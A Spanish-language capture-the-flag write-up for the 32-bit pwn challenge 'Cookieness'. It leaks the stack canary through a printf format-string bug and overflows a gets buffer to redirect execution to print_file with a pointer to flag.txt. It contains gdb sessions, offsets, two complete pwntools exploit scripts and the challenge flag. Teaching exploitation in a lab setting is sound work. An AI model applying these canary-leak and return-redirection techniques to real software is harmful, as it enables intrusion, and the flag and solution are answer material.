# Nombre del reto
- **Categoría:** Pwn
- **Dificultad:** ★★★☆☆
- **Autor:** [Merk](https://twitter.com/sr_merk)

### Descripción
He perdido mi galleta 😔  
Si la encuentras, quizá puedas llevarte una flag...

### Archivos e instrucciones
files.zip  
**Nota:** este archivo binario NO es el mismo que el de la competición. Las direcciones de memoria cambian (pero se resuelve de la misma manera 😉).   


### Hints
1. Piensa en el formato... ¿crees que todo el mundo sabe usar printf?
2. Se puede redirigir la ejecución del programa... a menos que me pises el CANARY.
3. ¿Has visto la función print_file? Creo que solo necesita un argumento...
   

### Flag
``CTFUni{U_g0t_ur_cooki3!}`` 
<br>

# Writeup
Cookieness es un reto de la categoría pwn. Consiste en leer un fichero *flag.txt* mediante una vulnerabilidad de format string y un buffer overflow.   
Podéis leer el writeup aquí o en [mi blog](https://dev.to/ntmerk/cookieness-write-up-d4a).  

### Reconocimiento
Un primer vistazo nos muestra que se trata de un binario de **32 bits**, **dynamically linked** y **not stripped** (así que quizá los símbolos nos puedan ayudar).

```
└─$ file cookieness      
cookieness: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=3a32702afe6d664b62c9d  
806d496072435a557e8, for GNU/Linux 3.2.0, not stripped
```

Si ejecutamos *strings* en el binario, obtendremos una pista. El string **flag.txt** parece ser nuestro objetivo.

```
└─$ strings cookieness  
... 
flag.txt  
Merk was here.  
Mostrando contenido de %s: %s  
Fichero %s no encontrado.  
Login:    
Bienvenido,    
Puedes leer flag.txt?
...
```

Cargando el binario con `gdb` y ejecutando `checksec`, podemos ver las siguientes protecciones habilitadas. 
* [**CANARY**/COOKIE](https://ir0nstone.gitbook.io/notes/types/stack/canaries)
	* Esto quiere decir que para sobrescribir EIP mediante un stack buffer overflow, necesitaremos conocer el valor de la cookie en cada ejecución.
* [NX (No eXecute)/DEP](https://ir0nstone.gitbook.io/notes/types/stack/no-execute)
	* Gracias a NX, no podremos ejecutar nuestro shellcode en el stack directamente.

```sh
gdb-peda$ checksec  
  
CANARY    : ENABLED  
FORTIFY   : disabled  
NX        : ENABLED  
PIE       : disabled  
RELRO     : Partial
```

Ejecutando el binario podemos observar que tenemos dos entradas, de las cuales la primera está reflejada por consola.

```bash
└─$ ./cookieness  
Login: test1
Bienvenido, test1
  
Puedes leer flag.txt?  
test2
```

Probando podemos observar que la primera entrada tiene un format string vulnerability, y si gritamos un poco parece que la segunda es vulnerable a un buffer overflow (pero sobrescribimos la cookie y obtenemos un **stack smashing detected**).

```bash
└─$ ./cookieness  
Login: %x  
Bienvenido, 804a065  
  
Puedes leer flag.txt?  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
*** stack smashing detected ***: terminated  
zsh: IOT instruction  ./cookieness
```

Por último, ya que el binario es **not stripped** podemos echarle un vistazo a las funciones. 

```assembly
gdb-peda$ info functions    
All defined functions:  
  
Non-debugging symbols:  
0x08049000  _init  
...
0x080491a6  print_file  
0x08049243  welcome  
0x080492f3  main  
...
0x08049334  _fini
```

Las funciones que pintan interesantes son **print_file**, **welcome** y **main**. Un vistazo rápido a **print_file** con cualquier decompiler nos revela que se utiliza para leer los contenidos de un fichero pasado como único argumento. Cabe destacar que esta función no se llama nunca.

```c
unsigned int __cdecl print_file(const char *a1)
{
  FILE *stream; // ST24_4
  char s; // [esp+18h] [ebp-70h]
  unsigned int v4; // [esp+7Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  stream = fopen(a1, (const char *)&unk_804A020);
  if ( fgets(&s, 100, stream) )
    printf("Mostrando contenido de %s: %s", a1, &s);
  else
    printf("Fichero %s no encontrado.", a1);
  return v4 - __readgsdword(0x14u);
}
```

### Pwning time

Teniendo en cuenta lo que acabamos de ver, una manera de resolver el reto consiste en:
1. Leer el CANARY o COOKIE de la función *welcome* usando el format string vulnerability
2. Hacer un stack buffer overflow usando el CANARY
3. Redirigir EIP a la función *print_file* colocando en el stack un puntero a *flag.txt*, ya que cuando ejecutamos **strings**, vimos que existía

El *printf* vulnerable que nos permite leer memoria del stack se encuentra en
`0x080492b3 <+112>:   call   0x8049040 <printf@plt>`
Por lo que le colocaremos un breakpoint. Ejecutaremos el binario hasta el breakpoint, y comprobaremos dónde se encuentra el CANARY para poder leerlo.

```
gdb-peda$ b * 0x080492b3  
Breakpoint 1 at 0x80492b3

gdb-peda$ run  
Starting program: /home/merk/****/cookieness    
[Thread debugging using libthread_db enabled]  
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".  
Login: test

Breakpoint 1, 0x080492b3 in welcome ()
```

Si miramos el final de la función *welcome*, podemos ver cómo se compara el CANARY. Veremos que sale de [ebp-0xc].

```assembly
  0x080492dd <+154>:   mov    eax,DWORD PTR [ebp-0xc]  <--- aquí
  0x080492e0 <+157>:   sub    eax,DWORD PTR gs:0x14  
  0x080492e7 <+164>:   je     0x80492ee <welcome+171>  
  0x080492e9 <+166>:   call   0x8049320 <__stack_chk_fail_local>
```

Entonces comprobamos en qué posición de ESP se encuentra el CANARY. Se encuentra a 11 DWORDS de distancia.

```assembly
gdb-peda$ x/x $ebp-0xc  
0xffffcdbc:     0xe4a1a300  <--- los CANARY siempre terminan en 00
gdb-peda$ x/20x $esp  
0xffffcd90:     0xffffcda8      0x0804a065      0xf7e21620      0x0804924f  
0xffffcda0:     0xf7fbf4a0      0xf7fd7a6c      0x74736574      0xf7fb000a  
0xffffcdb0:     0xffffcdf0      0xf7fbf66c      0xf7fbfb30      0xe4a1a300 <--- aquí 
0xffffcdc0:     0x00000001      0xf7e20ff4      0xffffcdd8      0x08049308  
0xffffcdd0:     0xffffd09b      0x00000070      0xf7ffd020      0xf7c213b5
```

Por ello, si en la primera entrada del binario colocamos **%11$x**, imprimiremos el CANARY.

```
└─$ ./cookieness  
Login: %11$x  
Bienvenido, 1e66b800  
  
Puedes leer flag.txt?
```

Ahora podemos intentar sobrescribirlo en la segunda entrada, y crashear el proceso con valores arbitrarios. Tenemos que saber a qué distancia se encuentra el CANARY de lo que sobrescribimos una vez se llama la función *gets*. Para ello, usaremos `pattern` de *gdb-peda* y veremos con qué offset sobrescribimos el CANARY.

```assembly
gdb-peda$ b * 0x080492e0  <--- en esta dirección se comprueba el CANARY
Breakpoint 1 at 0x80492e0

gdb-peda$ pattern create 50  
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'

gdb-peda$ run  
Starting program: /home/merk/****/cookieness      
Login: test  
Bienvenido, test  
  
Puedes leer flag.txt?  
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

[----------------------------------registers-----------------------------------]  
EAX: 0x41412d41 ('A-AA') <--- EAX contenía el CANARY, que hemos sobrescrito
...

gdb-peda$ pattern offset 0x41412d41  
1094790465 found at offset: 20
```

Ya sabemos que el CANARY se debe sobrescribir en el offset 20. Montando el siguiente script, veremos que hemos sobrescrito el CANARY y que podemos redirigir el programa.

```python
from pwn import *

# run the process
p = process("./cookieness")

gdb.attach(p, '''

break welcome

''')

# get the 11th stack variable (the canary/cookie)
p.send(b"%11$x\n")

# read the cookie from the abused string format vulnerability
cookie = p.readline(20).decode().split(', ')[1]
num = int(cookie, 16)
print("Cookie = " + hex(num))

# build the payload
payload = b"A" * 20
payload += p32(num) # get to the canary and overwrite it with itself
payload += b"B" * 50

# send the payload
p.sendline(payload)
p.interactive()
p.close()
```

Obtenemos un SIGSEGV.

```
Stopped reason: SIGSEGV  
0x42424242 in ?? ()
```

Como no sabemos si necesitamos un padding, volvemos a usar `pattern` y obtenemos que EIP está otros 12 bytes delante (no lo muestro porque es repetir el proceso). Ahora que podemos modificar EIP a nuestro gusto, solo nos queda apuntar a la función `print_file`, y pasar en el stack (encontrando el padding correcto de nuevo) un puntero al string *flag.txt*.

```bash
gdb-peda$ break main  
Breakpoint 1 at 0x80492f6

gdb-peda$ run

gdb-peda$ find flag.txt  
Searching for 'flag.txt' in: None ranges  
Found 4 results, display max 4 items:  
cookieness : 0x804a008 ("flag.txt")  
cookieness : 0x804a07f ("flag.txt?")  
cookieness : 0x804b008 ("flag.txt")  
cookieness : 0x804b07f ("flag.txt?")
```

Podemos usar cualquiera de las dos que no tienen un `?` al final. Y solo quedará construir el script.

```python
from pwn import *

print_file = 0x080491a6
flagtxt = 0x0804a008

# run the process
p = process("./cookieness")

# get the 11th stack variable (the canary/cookie)
p.send(b"%11$x\n")

# read the cookie from the abused string format vulnerability
cookie = p.readline(20).decode().split(', ')[1]
num = int(cookie, 16)
print("Cookie = " + hex(num))

# build the payload
payload = b"A" * 20
payload += p32(num) # get to the canary and overwrite it with itself
payload += b"B" * 12
payload += p32(print_file) # get to EIP and overwrite it with the print_file function
payload += b"C" * 4
payload += p32(flagtxt) # add an address that points to "flag.txt" to the stack as a parameter

# send the payload
p.sendline(payload)

# jackpot
print(p.recvall().decode())

p.close()
```

Y obtendríamos la flag.

```bash
└─$ python3 exploit.py  
[+] Starting local process './cookieness': pid 2417  
Cookie = 0x76d0fc00  
[+] Receiving all data: Done (81B)  
[*] Stopped process './cookieness' (pid 2417)  
  
Puedes leer flag.txt?  
Mostrando contenido de flag.txt: CTFUni{this_is_a_test_flag}
```